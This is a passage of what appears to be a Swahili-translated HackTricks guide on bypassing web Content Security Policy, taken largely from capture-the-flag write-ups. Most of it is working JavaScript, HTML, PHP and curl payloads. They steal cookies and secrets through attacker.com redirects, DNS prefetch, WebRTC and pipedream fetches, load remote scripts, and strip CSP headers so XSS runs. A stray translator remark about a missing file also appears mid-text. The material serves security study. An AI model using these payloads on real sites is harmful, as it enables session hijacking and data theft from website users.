let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Kupitia Bookmarklets

Shambulio hili linahitaji aina ya social engineering ambapo mshambulizi **anamhakikishia mtumiaji kuburuta na kuachia kiungo juu ya bookmarklet ya kivinjari**. Bookmarklet hii itakuwa na msimbo wa **javascript wenye madhara** ambao unapoburuta na kuachishwa au kubonyezwa unatekelezwa katika muktadha wa dirisha la wavuti la sasa, **kupita kando ya CSP na kuruhusu kuiba taarifa nyeti** kama cookies au tokens.

Kwa maelezo zaidi [**angalia ripoti ya asili hapa**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Kupita kando ya CSP kwa kuweka CSP kali

Katika [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP inapitia kando kwa kuingiza ndani ya iframe iliyoruhusiwa CSP kali zaidi ambayo ilinzuia kupakia faili maalum ya JS ambayo, kisha, kupitia **prototype pollution** au **dom clobbering** iliruhusu **kutumia script tofauti ili kupakia script yoyote**.

Unaweza **kuzuia CSP ya Iframe** kwa kutumia attribute **`csp`**:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
Katika [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), ilikuwa inawezekana kupitia **HTML injection** kuifanya **CSP** kuwa na vikwazo zaidi kiasi kwamba script iliyokuwa ikizuia **CSTI** ilizimwa na kwa hivyo **vulnerability became exploitable.**\
CSP inaweza kufanywa kuwa kali zaidi kwa kutumia **HTML meta tags** na **inline scripts** zinaweza kuzimwa kwa **kuondoa** **entry** inayoruhusu **nonce** yao na **enable specific inline script via sha**:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration with Content-Security-Policy-Report-Only

Iwapo unaweza kusababisha server kuituma header **`Content-Security-Policy-Report-Only`** yenye **thamani unayodhibiti** (labda kwa sababu ya CRLF), unaweza kuielekeza kwa server yako na ikiwa **utaweka** **JS content** unayotaka ku-exfiltrate ndani ya **`<script>`**, na kwa kuwa kuna uwezekano mkubwa `unsafe-inline` hauruhusiwi na CSP, hii itasababisha **CSP error** na sehemu ya script (iliyomo taarifa nyeti) itatumwa kwa server kupitia `Content-Security-Policy-Report-Only`.

Kwa mfano [**angalia hii CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking Taarifa na CSP na Iframe

- Kuna `iframe` inayoundwa inayoelekeza kwa URL (tuitaje `https://example.redirect.com`) ambayo inaruhusiwa na CSP.
- URL hii inapindaisha hadi URL ya siri (kwa mfano `https://usersecret.example2.com`) ambayo **haikiruhusiwi** na CSP.
- Kwa kusikiliza tukio la `securitypolicyviolation`, mtu anaweza kunasa property ya `blockedURI`. Property hii inaonyesha domain ya blocked URI, leaking the secret domain to which the initial URL redirected.

Inavutia kutambua kwamba browsers kama Chrome na Firefox zina tabia tofauti katika kushughulikia iframes kwa kuzingatia CSP, jambo linaloweza kusababisha leakage ya taarifa nyeti kutokana na undefined behavior.

Mbinu nyingine inahusisha exploiting the CSP yenyewe kubaini secret subdomain. Mbinu hii inategemea binary search algorithm na kurekebisha CSP ili kujumuisha specific domains ambazo zinalengwa kupigwa block kwa makusudi. Kwa mfano, ikiwa secret subdomain imejengwa kwa herufi zisizojulikana, unaweza kwa kurudia kujaribu subdomains tofauti kwa kubadilisha CSP directive ili ku-block au kuweka allow subdomains hizi. Hapa kuna snippet inayoonyesha jinsi CSP inaweza kuwekwa ili kuwezesha method hii:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Kwa kufuatilia maombi yanayozuiliwa au kuruhusiwa na CSP, mtu anaweza kupunguza herufi zinazowezekana katika subdomain ya siri, hatimaye kubaini URL kamili.

Mbinu zote mbili zinatumia utofauti mdogo wa utekelezaji wa CSP na tabia katika vivinjari, zikionyesha jinsi sera zinazojionyesha kuwa salama zinaweza kusababisha leak ya taarifa nyeti bila kukusudia.

Trick from [**here**](https://ctftime.org/writeup/29310).

## Teknolojia Hatari za Kuepuka CSP

### Makosa ya PHP wakati kuna params nyingi sana

Kulingana na the [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), kutuma vigezo vingi mno (1001 GET parameters ingawa pia unaweza kufanya hivyo kwa POST params na faili zaidi ya 20). Kila **`header()`** iliyobainishwa katika PHP web code **haitatumwa** kutokana na kosa ambalo hili litasababisha.

### PHP response buffer overload

PHP inajulikana kwa buffering the response to 4096 bytes kwa default. Kwa hiyo, ikiwa PHP inaonyesha warning, kwa kutoa data ya kutosha ndani ya warnings, the response itatumwa kabla ya CSP header, causing the header to be ignored.\
Then, the technique consists basically in filling the response buffer with warnings so the CSP header isn't sent.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Kill CSP via max_input_vars (headers already sent)

Kwa kuwa headers lazima zitumwe kabla ya output yoyote, warnings emitted by PHP zinaweza kuharibu au kufanya zisifanye kazi mwito za `header()` zinazofuata. Ikiwa user input itazidi `max_input_vars`, PHP itatoa startup warning kwanza; any subsequent `header('Content-Security-Policy: ...')` itashindwa na “headers already sent”, ikifanya CSP izimike kwa ufanisi na kuruhusu reflective XSS ambayo vinginevyo ingezuiliwa.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Sina maudhui ya faili. Tafadhali weka hapa yaliyomo ya src/pentesting-web/content-security-policy-csp-bypass/README.md ili niweze kuyatafsiri.
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Andika Upya Ukurasa la Kosa

Kutokana na [**this writeup**](https://blog.ssrf.kr/69) inaonekana kuwa ilikuwa inawezekana ku-bypass ulinzi wa CSP kwa kupakia ukurasa la kosa (huenda bila CSP) na kuandika upya yaliyomo yake.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME ni mbinu inayofanya matumizi mabaya ya XSS (au XSS iliyopunguzwa sana) **in an endpoint of a page** ili **kuabusu** **endpoints nyingine za same origin.** Hii hufanywa kwa kupakia endpoint yenye udhaifu kutoka ukurasa wa mshambuliaji kisha kusasisha (refresh) ukurasa wa mshambuliaji hadi endpoint halisi ndani ya origin sawa unayotaka kuabusu. Kwa njia hii **endpoint yenye udhaifu** inaweza kutumia object ya **`opener`** katika **payload** ili **kupata DOM** ya **endpoint halisi ili kuabusu.** Kwa taarifa zaidi angalia:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Zaidi ya hayo, **wordpress** ina endpoint ya **JSONP** katika `/wp-json/wp/v2/users/1?_jsonp=data` ambayo ita**reflect** the **data** iliyotumwa katika output (kwa kikomo cha herufi, nambari na nukta tu).

Mshambuliaji anaweza kutumia endpoint hiyo kuunda SOME attack dhidi ya WordPress na kuiingiza ndani ya `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` kumbuka kwamba **script** hii ita**loaded** kwa sababu ime **allowed by 'self'**. Zaidi ya hayo, na kwa sababu WordPress imewekwa, mshambuliaji anaweza kutumia **SOME attack** kupitia **vulnerable** **callback** endpoint ambayo **bypasses the CSP** ili kumpa mtumiaji vibali zaidi, kusanisha plugin mpya...\
Kwa taarifa zaidi kuhusu jinsi ya kufanya shambulio hili angalia [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

Kama kuna CSP kali ambayo haitakuacha kuwasiliana na server za nje, kuna mambo kadhaa unaweza kufanya kila wakati ili kuondoa taarifa.

### Location

Unaweza kubadilisha tu location ili kutuma kwa server ya mshambuliaji taarifa za siri:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Unaweza kufanya redirect kwa kuingiza meta tag (hii ni redirect tu; hii haitasababisha leak ya maudhui)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Ili kupakia kurasa kwa haraka, vivinjari hutatua awali majina ya mwenyeji (hostnames) kuwa anwani za IP na kuyahifadhi kwenye cache kwa matumizi baadaye.\\
Unaweza kumuonyesha kivinjari kutatua awali jina la mwenyeji kwa: `<link rel="dns-prefetch" href="something.com">`

Unaweza kutumia vibaya tabia hii ili **exfiltrate sensitive information via DNS requests**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Njia nyingine:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Ili kuzuia hili kutokee, seva inaweza kutuma HTTP header:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi kwenye headless browsers (bots)

### WebRTC

Kwenye kurasa kadhaa unaweza kusoma kwamba **WebRTC haiangalii sera ya `connect-src` ya CSP**.

Kwa kweli unaweza _leak_ taarifa kwa kutumia _DNS request_. Angalia code hii:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Chaguo jingine:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

Credential popup hutuma ombi la DNS kwenda iconURL bila kuzuiliwa na ukurasa. Inafanya kazi tu katika muktadha salama (HTTPS) au kwenye localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## Kukagua Sera za CSP Mtandaoni

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Kuunda CSP Kiotomatiki

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Marejeo

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
